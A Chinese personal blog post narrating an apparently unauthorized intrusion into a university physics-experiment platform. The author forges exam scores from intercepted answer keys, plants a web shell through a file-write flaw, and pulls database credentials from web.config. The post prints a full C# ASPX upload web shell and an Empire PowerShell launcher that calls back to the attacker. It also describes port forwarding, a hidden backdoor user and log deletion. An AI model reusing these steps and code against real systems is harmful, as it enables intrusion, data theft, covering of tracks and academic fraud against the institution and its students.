<!DOCTYPE html>

<!--
  portfolYOU Jekyll theme by Youssef Raafat
  Free for personal and commercial use under the MIT license
  https://github.com/YoussefRaafatNasry/portfolYOU
-->

<html lang="en" class="h-100">

<head>

  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content=""一只猫～"">

  <title>dyf's blog</title>
  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico">

  <!-- Font Awesome CDN -->
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css">

  <!-- Bootstrap CSS CDN -->
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">

  <!-- Animate CSS CDN -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.css" type="text/css"/>
  
  <!-- Custom CSS -->
  <link rel="stylesheet" href="/assets/css/style.css" type="text/css">

</head>


<body class="d-flex flex-column h-100">

  <main class="flex-shrink-0 container mt-5">
  <nav class="navbar navbar-expand-lg navbar-light">

  <a class="navbar-brand" href="/"><h5><b>dyf's blog</b></h5></a>

  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>

  <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
    <div class="navbar-nav ml-auto"><a class="nav-item nav-link " href="/projects/">Projects</a>

      <a class="nav-item nav-link active" href="/blog/">Blog</a>

      <a class="nav-item nav-link " href="/about/">About</a>

      

    </div>
  </div>

</nav>
  <div class="col-lg-10 mx-auto mt-5 post">
  <h1><b>某物理平台渗透日志</b></h1>

<p class="post-metadata text-muted">
  18 May 2020 -  
  <b>6 mins read time</b>

  <br>Tags: 
    
    <a class="text-decoration-none no-underline" href="/blog/tags#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95">
      <span class="tag badge badge-pill text-primary border border-primary">渗透测试</span>
    </a>
    </p>

<h3 id="前言">前言</h3>

<p>最近一直没有更新博客，实际上还是做了很多事情，比如：</p>

<ol>
  <li>破解了市面上常见的php源码加密</li>
  <li>学习了一点点编译原理的知识</li>
  <li>尝试自己写一个nes模拟器，我没想到的是，通过这个项目我学会了反汇编的原理哈哈哈</li>
  <li>逆向分析了一波这个物理实验的客户端</li>
</ol>

<p>最近学业上的压力比较大，搞得我焦头烂额，现在只想早点回学校找小张同学玩嘿嘿嘿～</p>

<blockquote>
  <p>ps : 这玩意儿最近更新了，里面的包都加密了，不过我做了一下逆向，目前已经成功解密，这一部分我暂时没有时间写出来。</p>
</blockquote>

<h3 id="某平台渗透记录">某平台渗透记录</h3>
<hr />

<h3 id="0x01-背景">0x01 背景</h3>

<p>这星期突然开了物理实验，心里十分难受，看了一下这个玩意儿是个windows客户端，这个东西中国科技大学做的，感觉应该不咋地，然后看了一下这个复古的UI，我彻底放弃了学习的念头。正好之前没弄过客户端或者.net相关的东西，这次练习一下。</p>

<h3 id="0x02-修改分数">0x02 修改分数</h3>

<p>最开始的目的仅仅是看看能不能改一下分数，有一下几个思路：</p>

<ul>
  <li>如果是本见校验，直接抓包改分</li>
  <li>如果每题分数都发到后端，想办法hook接口，把分数改成满分</li>
  <li>如果每一题发到后端判分…不会这么惨吧</li>
</ul>

<p>于是用burp看了一下：</p>

<p><img src="http://pic.dyf.ink/1-2020-5-18.png" alt="1.jpg" /></p>

<p><img src="http://pic.dyf.ink/2-2020-5-18.png" alt="2.jpg" /></p>

<p><img src="http://pic.dyf.ink/3-2020-5-18.png" alt="3.jpg" /></p>

<p>linux截图有点麻烦，就截三张比较关键的，第一个应该是注册个读文件的组件，然后返回一个id，这个组件似乎是反序列化生成的。
第二张图里的包里面一大堆东西，盲猜base64,解码之后发现是标准答案的xml…至少答案是到手了。</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nt">&lt;TotalScore&gt;</span>3<span class="nt">&lt;/TotalScore&gt;</span>
    <span class="nt">&lt;RealScore&gt;</span>3<span class="nt">&lt;/RealScore&gt;</span>
        <span class="nt">&lt;JudgeRule&gt;</span>
        <span class="nt">&lt;RightRule&gt;</span>
          <span class="nt">&lt;Score&gt;</span>3<span class="nt">&lt;/Score&gt;</span>
          <span class="nt">&lt;RuleShowInfo&gt;</span>光电管使用正确<span class="nt">&lt;/RuleShowInfo&gt;</span>
        <span class="nt">&lt;/RightRule&gt;</span>
        <span class="nt">&lt;WrongRule&gt;</span>
          <span class="nt">&lt;Score&gt;</span>0<span class="nt">&lt;/Score&gt;</span>
          <span class="nt">&lt;RuleShowInfo&gt;</span>光电管使用不正确，老化加速<span class="nt">&lt;/RuleShowInfo&gt;</span>
            <span class="nt">&lt;/WrongRule&gt;</span>
          <span class="nt">&lt;/JudgeRule&gt;</span>
          <span class="nt">&lt;StudentResultShowInfo&gt;</span>光电管使用不正确，老化加速<span class="nt">&lt;/StudentResultShowInfo&gt;</span>
    <span class="nt">&lt;/Para&gt;</span>
    <span class="nt">&lt;Para</span> <span class="na">StudentVisible=</span><span class="s">"false"</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p>第三张图就是我们发的分数情况的包了，根据第一个包注册的id然后发送对应的分数，再把第二包的内容换成正确答案就可以弄满分了。</p>

<h3 id="0x03-拿shell">0x03 拿shell</h3>

<p>我在第二个包里看到，这个包似乎往服务器上写了xml文件，虽然是一段base64。但是文件名我们还是可控的，于是写了个一句话试了一下，果然成功了，居然还是管理员权限，提权都免了。</p>

<p>但是上来看了一下，发现后端是c#写的，已经打包成dll了，于是放弃代码审计，等以后有兴趣再继续逆向分析。</p>

<p><img src="http://pic.dyf.ink/4-2020-5-18.png" alt="shell" /></p>

<p>然后接下来就是想办法拖一下库子，由于之前没见过.NET的后端，不知道数据库配置文件咋看的，于是研究了一下。<br />
这个配置文件主要在web.config这个文件里：</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;configuration&gt;</span>
  <span class="nt">&lt;configSections&gt;</span>
    <span class="nt">&lt;section</span> <span class="na">name=</span><span class="s">"entityFramework"</span> <span class="na">type=</span><span class="s">"System.Data.Entity.Internal.ConfigFile.EntityFrameworkSection, EntityFramework, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"</span> <span class="na">requirePermission=</span><span class="s">"false"</span> <span class="nt">/&gt;</span>
    <span class="c">&lt;!-- For more information on Entity Framework configuration, visit http://go.microsoft.com/fwlink/?LinkID=237468 --&gt;</span>
  <span class="nt">&lt;/configSections&gt;</span>
  <span class="nt">&lt;connectionStrings&gt;</span>
    <span class="nt">&lt;add</span> <span class="na">name=</span><span class="s">"USTCOriEntities"</span> <span class="na">connectionString=</span><span class="s">"metadata=res://*/USTCOri_Models.csdl|res://*/USTCOri_Models.ssdl|res://*/USTCOri_Models.msl;provider=System.Data.SqlClient;provider connection string=&amp;quot;data source=.;initial catalog=oooooooo;persist security info=True;user id=sa;password=xxxxxxx;multipleactiveresultsets=True;Connect Timeout=120;App=EntityFramework&amp;quot;"</span> <span class="na">providerName=</span><span class="s">"System.Data.EntityClient"</span> <span class="nt">/&gt;</span>
  <span class="nt">&lt;/connectionStrings&gt;</span>
</code></pre></div></div>

<p>​    web.config文件是一个XML文件，它的根结点是<code class="highlighter-rouge">&lt;configuration&gt;</code>，在<code class="highlighter-rouge">&lt;configuration&gt;</code>节点下的常见子节点有：<code class="highlighter-rouge">&lt;configSections&gt;</code>,<code class="highlighter-rouge">&lt;appSettings&gt;</code>,<code class="highlighter-rouge">&lt;connectionStrings&gt;</code>和<code class="highlighter-rouge">&lt;system.web&gt;</code>。</p>

<p>​    其中<code class="highlighter-rouge">&lt;appSettings&gt;</code>节点主要用于配置一些网站的应用配置信息，而<code class="highlighter-rouge">&lt;connectionStrings&gt;</code>节点主要用于配置网站的数据库连接字符串信息。</p>

<p>​    <code class="highlighter-rouge">&lt;appSettings&gt;</code>节点主要用来存储asp.net应用程序的一些配置信息，比如上传文件的保存路径等，以下是一个例子：</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;appSettings&gt;</span> 
    <span class="c">&lt;!--允许上传的图片格式类型--&gt;</span> 
    <span class="nt">&lt;add</span> <span class="na">key=</span><span class="s">"ImageType"</span> <span class="na">value=</span><span class="s">".jpg;.bmp;.gif;-2020-5-18.png;.jpeg"</span><span class="nt">/&gt;</span> 
    <span class="c">&lt;!--允许上传的文件类型--&gt;</span> 
    <span class="nt">&lt;add</span> <span class="na">key=</span><span class="s">"FileType"</span> <span class="na">value=</span><span class="s">".jpg;.bmp;.gif;-2020-5-18.png;.jpeg;.pdf;.zip;.rar;.xls;.doc"</span><span class="nt">/&gt;</span> 
<span class="nt">&lt;/appSettings&gt;</span>
</code></pre></div></div>

<p><code class="highlighter-rouge">&lt;connectionStrings&gt;</code>节点主要用于配置数据库连接的，我们可以<code class="highlighter-rouge">&lt;connectionStrings&gt;</code>节点中增加任意个节点来保存数据库连接字符串，将来在代码中通过代码的方式动态获取节点的值来实例化数据库连接对象，这样一旦部署的时候数据库连接信息发生变化我们仅需要更改此处的配置即可，而不必因为数据库连接信息的变化而需要改动程序代码和重新部署。</p>

<p>​    以下就是一个<code class="highlighter-rouge">&lt;connectionStrings&gt;</code>节点配置的例子，也是这台服务器的配置：</p>
<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;connectionStrings&gt;</span>
    <span class="nt">&lt;add</span> <span class="na">name=</span><span class="s">"USTCOriEntities"</span> <span class="na">connectionString=</span><span class="s">"metadata=res://*/USTCOri_Models.csdl|res://*/USTCOri_Models.ssdl|res://*/USTCOri_Models.msl;provider=System.Data.SqlClient;provider connection string=&amp;quot;data source=.;initial catalog=ooooooooo;persist security info=True;user id=sa;password=*********;multipleactiveresultsets=True;Connect Timeout=120;App=EntityFramework&amp;quot;"</span> <span class="na">providerName=</span><span class="s">"System.Data.EntityClient"</span> <span class="nt">/&gt;</span>
  <span class="nt">&lt;/connectionStrings&gt;</span>

  <span class="c">&lt;!-- 密码我就不公开了 --&gt;</span>
</code></pre></div></div>

<p><code class="highlighter-rouge">&lt;compilation&gt;</code>节点配置 ASP.NET 使用的所有编译设置。默认的debug属性为“true”，即允许调试，在这种情况下会影响网站的性能，所以在程序编译完成交付使用之后应将其设为”false”。</p>

<p>其他的标签我们暂时先不关心，仔细分析了一下<code class="highlighter-rouge">&lt;connectionStrings&gt;</code>标签，我们可以得到一下信息：</p>

<ul>
  <li>userid -&gt; sa</li>
  <li>password -&gt; ××××××××</li>
  <li>catalog -&gt; ooooooooo</li>
</ul>

<p>我们并没有发现数据库的Host地址，应该是在别的目录下的web.config里写过了，这里直接<code class="highlighter-rouge">metadata=res://*/USTCOri_Models.csdl|res://*/USTCOri_Models.ssdl|res://*/USTCOri_Models.msl</code>像是直接调用了这个对象。这个<strong>catalog</strong>就是数据库的库名。然后试了一下，果然连上了。</p>

<p><img src="./http://pic.dyf.ink/5-2020-5-18.png" alt="data" /></p>

<h3 id="0x04-权限维持">0x04 权限维持</h3>

<p>弄到这里，我想着不如用empire在上面写个dll，稳定一下权限，说不定可以内网横行啥的。这里就发生了一个很蛋疼的事情，我在网上找了半天也没有找到一个比较好用的asp的马，都是各种不能使的臭鱼烂虾，连文件上传的功能都实现不了。于是速成了一下asp脚本(c#写的…)，写了个上传：</p>
<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;%</span><span class="err">@</span> <span class="n">Page</span> <span class="n">Language</span><span class="p">=</span><span class="s">"C#"</span> <span class="p">%&gt;</span>
<span class="p">&lt;%</span><span class="err">@</span> <span class="n">Import</span> <span class="n">Namespace</span><span class="p">=</span><span class="s">"System.IO"</span> <span class="p">%&gt;</span>

<span class="p">&lt;!</span><span class="n">DOCTYPE</span> <span class="n">html</span> <span class="n">PUBLIC</span> <span class="s">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="s">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span><span class="p">&gt;</span>

<span class="p">&lt;</span><span class="n">script</span> <span class="n">runat</span><span class="p">=</span><span class="s">"server"</span><span class="p">&gt;</span>
    <span class="k">private</span> <span class="k">const</span> <span class="kt">string</span> <span class="n">AUTHKEY</span> <span class="p">=</span> <span class="s">"admin"</span><span class="p">;</span>
    <span class="k">private</span> <span class="k">const</span> <span class="kt">string</span> <span class="n">HEADER</span> <span class="p">=</span> <span class="s">"&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;filesystembrowser&lt;/title&gt;\n&lt;style type=\"text/css\"&gt;&lt;!--\nbody,table,p,pre,form input,form select {\n font-family: \"Lucida Console\", monospace;\n font-size: 88%;\n}\n--&gt;\n&lt;/style&gt;&lt;/head&gt;\n&lt;body&gt;\n"</span><span class="p">;</span>
    <span class="k">private</span> <span class="k">const</span> <span class="kt">string</span> <span class="n">FOOTER</span> <span class="p">=</span> <span class="s">"&lt;/body&gt;\n&lt;/html&gt;\n"</span><span class="p">;</span>

    <span class="k">protected</span> <span class="k">void</span> <span class="nf">Page_Load</span><span class="p">(</span><span class="kt">object</span> <span class="n">sender</span><span class="p">,</span> <span class="n">EventArgs</span> <span class="n">e</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">try</span>
        <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">Request</span><span class="p">.</span><span class="n">Params</span><span class="p">[</span><span class="s">"authkey"</span><span class="p">]</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">Response</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="n">HEADER</span><span class="p">);</span>
                <span class="n">Response</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">GetUploadControls</span><span class="p">());</span>
                <span class="n">Response</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="n">FOOTER</span><span class="p">);</span>
                <span class="k">return</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">Request</span><span class="p">.</span><span class="n">Params</span><span class="p">[</span><span class="s">"authkey"</span><span class="p">]</span> <span class="p">!=</span> <span class="n">AUTHKEY</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">Response</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="n">HEADER</span><span class="p">);</span>
                <span class="n">Response</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">GetUploadControls</span><span class="p">());</span>
                <span class="n">Response</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="n">FOOTER</span><span class="p">);</span>
                <span class="k">return</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="k">if</span> <span class="p">(</span><span class="n">Request</span><span class="p">.</span><span class="n">Params</span><span class="p">[</span><span class="s">"operation"</span><span class="p">]</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">Request</span><span class="p">.</span><span class="n">Params</span><span class="p">[</span><span class="s">"operation"</span><span class="p">]</span> <span class="p">==</span> <span class="s">"upload"</span><span class="p">)</span>
                <span class="p">{</span>
                    <span class="n">Response</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="n">HEADER</span><span class="p">);</span>
                    <span class="n">Response</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">UploadFile</span><span class="p">());</span>
                    <span class="n">Response</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="n">FOOTER</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="k">else</span>
                <span class="p">{</span>
                    <span class="n">Response</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="n">HEADER</span><span class="p">);</span>
                    <span class="n">Response</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="s">"Unknown operation"</span><span class="p">);</span>
                    <span class="n">Response</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="n">FOOTER</span><span class="p">);</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="k">else</span>
            <span class="p">{</span>
                <span class="n">Response</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="n">HEADER</span><span class="p">);</span>
                <span class="n">Response</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">GetUploadControls</span><span class="p">());</span>
                <span class="n">Response</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="n">FOOTER</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">ex</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">Response</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="n">HEADER</span><span class="p">);</span>
            <span class="n">Response</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="n">ex</span><span class="p">.</span><span class="n">Message</span><span class="p">);</span>
            <span class="n">Response</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="n">FOOTER</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="kt">string</span> <span class="nf">UploadFile</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">try</span>
        <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">Request</span><span class="p">.</span><span class="n">Params</span><span class="p">[</span><span class="s">"authkey"</span><span class="p">]</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="k">return</span> <span class="kt">string</span><span class="p">.</span><span class="n">Empty</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">Request</span><span class="p">.</span><span class="n">Params</span><span class="p">[</span><span class="s">"authkey"</span><span class="p">]</span> <span class="p">!=</span> <span class="n">AUTHKEY</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="k">return</span> <span class="kt">string</span><span class="p">.</span><span class="n">Empty</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="k">if</span> <span class="p">(</span><span class="n">Request</span><span class="p">.</span><span class="n">Files</span><span class="p">.</span><span class="n">Count</span> <span class="p">!=</span> <span class="m">1</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="k">return</span> <span class="s">"No file selected"</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="n">HttpPostedFile</span> <span class="n">httpPostedFile</span> <span class="p">=</span> <span class="n">Request</span><span class="p">.</span><span class="n">Files</span><span class="p">[</span><span class="m">0</span><span class="p">];</span>
            <span class="kt">int</span> <span class="n">fileLength</span> <span class="p">=</span> <span class="n">httpPostedFile</span><span class="p">.</span><span class="n">ContentLength</span><span class="p">;</span>
            <span class="kt">byte</span><span class="p">[]</span> <span class="n">buffer</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="n">fileLength</span><span class="p">];</span>
            <span class="n">httpPostedFile</span><span class="p">.</span><span class="n">InputStream</span><span class="p">.</span><span class="nf">Read</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">fileLength</span><span class="p">);</span>
            <span class="n">FileInfo</span> <span class="n">fileInfo</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">FileInfo</span><span class="p">(</span><span class="n">Request</span><span class="p">.</span><span class="n">PhysicalPath</span><span class="p">);</span>
            <span class="k">using</span> <span class="p">(</span><span class="n">FileStream</span> <span class="n">fileStream</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">FileStream</span><span class="p">(</span><span class="n">Path</span><span class="p">.</span><span class="nf">Combine</span><span class="p">(</span><span class="n">fileInfo</span><span class="p">.</span><span class="n">DirectoryName</span><span class="p">,</span> <span class="n">Path</span><span class="p">.</span><span class="nf">GetFileName</span><span class="p">(</span><span class="n">httpPostedFile</span><span class="p">.</span><span class="n">FileName</span><span class="p">)),</span> <span class="n">FileMode</span><span class="p">.</span><span class="n">Create</span><span class="p">))</span>
            <span class="p">{</span>
                <span class="n">fileStream</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">buffer</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="s">"File uploaded"</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">ex</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">return</span> <span class="n">ex</span><span class="p">.</span><span class="nf">ToString</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="kt">string</span> <span class="nf">GetUploadControls</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="kt">string</span> <span class="n">temp</span> <span class="p">=</span> <span class="kt">string</span><span class="p">.</span><span class="n">Empty</span><span class="p">;</span>
        <span class="n">temp</span> <span class="p">=</span> <span class="s">"&lt;form enctype=\"multipart/form-data\" action=\"?operation=upload\" method=\"post\"&gt;"</span><span class="p">;</span>
        <span class="n">temp</span> <span class="p">+=</span> <span class="s">"&lt;br&gt;Auth Key: &lt;input type=\"text\" name=\"authKey\"&gt;&lt;br&gt;"</span><span class="p">;</span>
        <span class="n">temp</span> <span class="p">+=</span> <span class="s">"&lt;br&gt;Please specify a file: &lt;input type=\"file\" name=\"file\"&gt;&lt;/br&gt;"</span><span class="p">;</span>
        <span class="n">temp</span> <span class="p">+=</span> <span class="s">"&lt;div&gt;&lt;input type=\"submit\" value=\"Send\"&gt;&lt;/div&gt;"</span><span class="p">;</span>
        <span class="n">temp</span> <span class="p">+=</span> <span class="s">"&lt;/form&gt;"</span><span class="p">;</span>
        <span class="k">return</span> <span class="n">temp</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">&lt;/</span><span class="n">script</span><span class="p">&gt;</span>
</code></pre></div></div>

<p>到这里我们终于有了上传，于是我首先用empire生成了一个launcher_bat：</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@echo <span class="na">off</span>
<span class="nb">start</span> <span class="na">/b </span><span class="kd">powershell</span> <span class="na">-noP -sta -w </span><span class="m">1</span> <span class="na">-enc  </span><span class="kd">SQBmACgAJABQAFMAVgBFAHIAcwBpAG8ATgBUAGEAYgBMAEUALgBQAFMAVgBFAFIAcwBJAG8ATgAuAE0AYQBqAG8AcgAgAC0ARwBFACAAMwApAHsAJABHAFAARgA9AFsAcgBlAGYAXQAu</span>
。。。。。。。

<span class="nb">start</span> <span class="na">/b </span><span class="s2">""</span> <span class="nb">cmd</span> <span class="na">/c </span><span class="nb">del</span> <span class="s2">"</span><span class="vm">%~f0</span><span class="s2">"</span><span class="o">&amp;</span><span class="k">exit</span> <span class="na">/b

</span></code></pre></div></div>
<p>你可能会问为啥不直接用上面写文件的漏洞写bat呀？当然可以，但是后面我们上传lcx的时候就很蛋疼。。。</p>

<p>你可能又疑惑，为啥不用empire直接upload呀？因为empire的上传功能只能小于1M。
然后我们直接弹了shell回来，发现能用.
<img src="http://pic.dyf.ink/6-2020-5-18.png" alt="6" />
感觉empire还是不错的，很好的支持powershell，日windows非常舒服。但是和cs比起来还是有一些差距。empire也支持beacon或者dns backdoor这种东西，最棒的是内置<strong>mimikatz</strong>！！具体不多介绍了，看一下系统信息：</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>主机名:           WLZYv30043
OS 名称:          Microsoft Windows Server 2008 R2 Enterprise 
OS 版本:          6.1.7600 暂缺 Build 7600
OS 制造商:        Microsoft Corporation
OS 配置:          独立服务器
OS 构件类型:      Multiprocessor Free
注册的所有人:     User
注册的组织:       Lenovo
产品 ID:          00486-OEM-8400691-20006
初始安装日期:     2020/2/7, 21:36:42
系统启动时间:     2020/4/4, 22:10:21
系统制造商:       Bochs
系统型号:         Bochs
系统类型:         x64-based PC
处理器:           安装了 1 个处理器。
                  [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2100 Mhz
BIOS 版本:        Bochs Bochs, 2011/1/1
Windows 目录:     C:\Windows
系统目录:         C:\Windows\system32
启动设备:         \Device\HarddiskVolume1
系统区域设置:     zh-cn;中文(中国)
输入法区域设置:   zh-cn;中文(中国)
时区:             (UTC+08:00)北京，重庆，香港特别行政区，乌鲁木齐
物理内存总量:     8,192 MB
可用的物理内存:   4,570 MB
虚拟内存: 最大值: 16,381 MB
虚拟内存: 可用:   12,620 MB
虚拟内存: 使用中: 3,761 MB
页面文件位置:     C:\pagefile.sys
域:               WORKGROUP
登录服务器:       暂缺
修补程序:         安装了 30 个修补程序。
                  [01]: KB981391
                  [02]: KB981392
                  [03]: KB977236
                  [04]: KB981111
                  [05]: KB977238
                  [06]: KB977239
                  ..............
                  [20]: KB978601
                  [21]: KB978637
                  [22]: KB979099
                  [23]: KB979306
                  [24]: KB979309
                  [25]: KB979683
                  [26]: KB980182
                  [27]: KB980232
                  [28]: KB980302
                  [29]: KB980408
                  [30]: KB981332
网卡:             安装了 1 个 NIC。
                  [01]: Red Hat VirtIO Ethernet Adapter
                      连接名:      本地连接
                      启用 DHCP:   否
                      IP 地址
                        [01]: 10.69.25.215
                        [02]: fe80::306c:95bc:7f80:87b9
</code></pre></div></div>

<p>接下来用<code class="highlighter-rouge">windows-exploit-suggester.py</code>看一下漏洞啥的：
<img src="http://pic.dyf.ink/8-2020-5-18.png" alt="exploit" />
反正也是一堆问题，能提权啥的，用msf应该可直接日，不仔细看了。</p>

<p>然后就开始lcx想办法转发一下端口，把本地的1433端口转发出来，然后用datagrip直接连，可能会舒服一点。
我自己比较喜欢的是这个版本：<a href="https://github.com/cw1997/NATBypass">lcx</a></p>

<p>golang写的，全平台支持，比较爽。</p>

<p>然后就是把端口弹出来：
<img src="http://pic.dyf.ink/7-2020-5-18.png" alt="port" /></p>

<p>可以看到已经连上了，这里再用datagrip连一下测试测试：
<img src="http://pic.dyf.ink/9-2020-5-18.png" alt="datagrip" />
可以看到数据表已经加载出来了，由于网速极慢…表的内容加载不出来。</p>

<p>后期我们还可以把3389直接弹出来，访问就方便啦。</p>

<h3 id="0x05-收尾">0x05 收尾</h3>

<p>​    以前没咋弄过win，不知道咋清理log的，这里就先把能删除的删了，然后添加了个用户，弄隐藏了。最后把mimikatz和lcx的进程给删了，数据库的记录删了，然后server的log也删了一些。</p>

<p>​    接下来，估计可以试一下横向移动之类的。</p>


</div>
  </main>

  <footer class="mt-auto py-3 text-center">

  <small class="text-muted mb-2">
    <i class="fas fa-code"></i> with <i class="fas fa-heart"></i>
    by <strong>dyf</strong>
  </small>

  <div class="container-fluid justify-content-center">

</div><small id="attribution">
    theme <a href="https://github.com/YoussefRaafatNasry/portfolYOU">portfolYOU</a>
  </small>
  
</footer>
  <!-- GitHub Buttons -->
<script async defer src="https://buttons.github.io/buttons.js"></script>

<!-- jQuery CDN -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

<!-- Popper.js CDN -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"></script>

<!-- Bootstrap JS CDN -->
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>

<!-- wow.js CDN & Activation -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/wow/1.1.2/wow.js"></script>
<script> new WOW().init(); </script>

<!-- Initialize all tooltips -->
<script>
$(function () {
    $('[data-toggle="tooltip"]').tooltip()
})
</script>

</body>

</html>